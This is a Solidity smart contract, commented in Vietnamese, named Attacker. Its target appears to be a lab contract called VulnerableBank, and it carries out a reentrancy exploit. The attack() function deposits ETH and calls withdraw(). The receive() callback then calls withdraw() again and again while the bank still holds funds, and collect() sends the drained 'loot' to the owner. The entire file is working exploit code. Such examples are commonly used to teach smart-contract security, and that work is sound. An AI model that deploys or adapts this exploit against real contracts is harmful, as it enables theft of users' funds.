// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function bankBalance() external view returns (uint256);
}

/// @title Attacker - Hop dong khai thac lo hong Reentrancy tren VulnerableBank
/// @notice Rut can toan bo so du ngan hang thong qua ham receive() goi lai withdraw()
contract Attacker {
    IVulnerableBank public immutable bank;
    address public immutable owner;

    event AttackStarted(uint256 initialDeposit);
    event AttackStep(uint256 bankBalanceRemaining);
    event LootCollected(address indexed owner, uint256 totalLoot);

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    /// @notice Kich hoat tan cong: nap 1 ETH roi goi withdraw()
    function attack() external payable {
        require(msg.value >= 1 ether, "Can it nhat 1 ETH lam von moi");
        emit AttackStarted(msg.value);

        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    /// @notice Ham callback tu dong kich hoat khi nhan ETH tu ngan hang
    receive() external payable {
        emit AttackStep(address(bank).balance);
        // Neu ngan hang van con it nhat 1 ETH, tiep tuc goi withdraw de rut tiep
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    /// @notice Rut toan bo chien loi pham ve vi chu so huu
    function collect() external {
        require(msg.sender == owner, "Khong phai chu so huu");
        uint256 total = address(this).balance;
        emit LootCollected(owner, total);
        (bool ok, ) = payable(owner).call{value: total}("");
        require(ok, "Chuyen tien that bai");
    }
}
